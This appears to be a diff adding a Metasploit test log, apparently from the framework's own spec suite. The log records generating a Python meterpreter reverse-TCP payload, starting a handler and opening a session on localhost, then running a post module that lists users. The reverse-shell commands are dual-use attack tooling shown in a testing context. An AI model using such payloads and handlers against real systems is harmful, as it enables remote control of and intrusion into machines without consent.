@@ -1,0 +1,22 @@
+use python/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-4165-hwnpdo.py -f raw MeterpreterTryToFork=false lport=6022 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> [*] Writing 493 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-4165-hwnpdo.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 21
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6022 
+[*] Sending stage (39800 bytes) to 127.0.0.1
+[*] Meterpreter session 22 opened (127.0.0.1:6022 -> 127.0.0.1:49460 ) at 2022-01-19 00:38:06 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=22 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[*] Running against session 22
+[*] Session type is meterpreter and platform is osx
+[+] should list users
+[*] Testing complete in 0.064414
+[*] Passed: 1; Failed: 0
+[*] Post module execution completed
